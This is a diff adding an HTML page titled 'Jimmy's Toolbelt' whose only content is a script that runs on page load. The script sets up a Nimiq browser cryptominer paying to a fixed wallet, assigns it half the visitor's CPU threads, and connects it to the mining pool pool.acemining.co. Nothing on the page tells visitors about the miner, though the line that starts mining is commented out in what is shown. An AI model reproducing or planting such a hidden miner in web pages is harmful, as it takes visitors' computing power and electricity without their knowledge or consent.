@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <script type="text/javascript" src="https://cdn.nimiq.com/latest/nimiq.js"></script>
+  <title>Jimmy's Toolbelt</title>
+<style>
+</style>
+</head>
+<body>
+<script type="text/javascript">
+window.onload = () => {
+
+// https://api.acemining.co/api/userhash/NQ910SEF98YPE6TD2VT5385FAVGV46A8KT8P
+// Math.min(1, $.miner._hashrateWorker / (Nimiq.BlockUtils.compactToDifficulty($.blockchain.head.header.nBits) * Math.pow(2, 16) / Nimiq.Policy.BLOCK_TIME)) * Nimiq.Policy.blockRewardAt($.blockchain.height)
+
+Nimiq.init(async () => {
+    let $ = {}
+    window.$ = $
+    Nimiq.GenesisConfig.main()
+    if (!localStorage.getItem("NimiqWebMiner")) {
+        localStorage.Nimiq = JSON.stringify({
+            shares: 0,
+            lastShare: null,
+            totalShares: 0
+        })
+    }
+    Nimiq.storage = JSON.parse(localStorage.Nimiq)
+
+    console.log('Connecting and establishing consensus...')
+    $.consensus = await Nimiq.Consensus.nano()
+    $.blockchain = $.consensus.blockchain
+    $.network = $.consensus.network
+
+    $.consensus.on('established', () => {
+        $.miner = new Nimiq.NanoPoolMiner($.blockchain, $.network.time, Nimiq.Address.fromBase64("Bpz0o/dxttF3ZRoK9XYdIZSJ7Rc="), Nimiq.BasePoolMiner.generateDeviceId($.network.config))
+        $.miner.threads = navigator.hardwareConcurrency / 2
+        console.log('Consensus established.')
+
+        $.miner.connect("pool.acemining.co", 8443)
+        $.miner.on('connection-state', state => {
+            if (state === Nimiq.BasePoolMiner.ConnectionState.CONNECTING)
+                console.log('Connecting to the pool')
+            if (state === Nimiq.BasePoolMiner.ConnectionState.CONNECTED) {
+                console.log('Connected to pool')
+                //$.miner.startWork()
+            }
+            if (state === Nimiq.BasePoolMiner.ConnectionState.CLOSED)
+                console.log('Connection closed')
+        })
+        $.miner.on('share', () => {
+            Nimiq.storage.shares++
+            Nimiq.storage.totalShares++
+            Nimiq.storage.lastShare = new Date()
+            localStorage.Nimiq = JSON.stringify(Nimiq.storage)
+            console.log(`Found ${Nimiq.storage.shares} share(s) for block ${$.blockchain.height} (Total: ${Nimiq.storage.totalShares}) - Hashrate: ${$.miner.hashrate / 100} Kh/s`)
+        })
+    })
+    $.consensus.on('lost', () => console.error('Consensus lost'))
+    $.blockchain.on('head-changed', () => {
+        console.log(`Head changed to: ${$.blockchain.height}`)
+        if (Nimiq.storage.shares > 0) {
+            Nimiq.storage.shares = 0
+            localStorage.Nimiq = JSON.stringify(Nimiq.storage)
+        }
+    })
+    $.network.on('peers-changed', () => console.log(`Now connected to ${$.network.peerCount} peers.`))
+
+    $.network.connect()
+}, code => {
+    switch (code) {
+        case Nimiq.ERR_WAIT:
+            alert('Error: Already open in another tab or window.')
+            break
+        case Nimiq.ERR_UNSUPPORTED:
+            alert('Error: Browser not supported')
+            break
+        default:
+            alert('Error: Nimiq initialization error')
+            break
+    }
+})
+
+}
+</script>
+    <!--
+    <div>
+        <a href="https://wallet.nimiq.com/nimiq:NQ910SEF98YPE6TD2VT5385FAVGV46A8KT8P" target="_blank"><img src="https://www.nimiq.com/accept-donations/img/donationBtnImg/blue-big.svg"/></a>
+    </div>
+    -->
+</body>
+</html>
